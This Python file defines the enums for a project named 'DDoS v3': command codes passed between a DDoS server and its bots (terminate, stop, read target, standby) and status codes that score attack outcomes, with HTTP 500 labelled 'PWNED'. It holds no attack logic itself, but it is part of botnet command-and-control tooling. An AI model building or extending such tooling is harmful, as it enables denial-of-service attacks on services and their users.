#!/usr/bin/env python3

"""
DDoS v3

This module contains the Enums used in DDoS.
"""

# pylint: disable=duplicate-code
from enum import IntEnum


class ServerCommands(IntEnum):
    """
    The different commands sent by DDoS Server.
    """
    #: Kill the Bot.
    TERMINATE: int = -1
    #: Stop the attack and go to standby.
    STOP: int = 0
    #: Please perform a read to get the target address.
    READ_TARGET: int = 1


class ClientCommands(IntEnum):
    """
    The different commands sent by DDoS Client.
    """
    #: Something went wrong.
    ERROR: int = -2
    #: Bot Terminated.
    KILLED: int = -1
    #: Stopped previous attack, on standby.
    STANDBY: int = 0
    #: Send me the target address.
    SEND_TARGET: int = 1
    #: Please perform a read to get the status.
    READ_STATUS: int = 2


class StatusCodes(IntEnum):
    """
    The different HTTP error codes.
    """
    CONNECTION_FAILURE: int = 69
    NO_LUCK: int = 200
    ANTI_DDOS: int = 400
    FORBIDDEN: int = 403
    NOT_FOUND: int = 404
    PWNED: int = 500
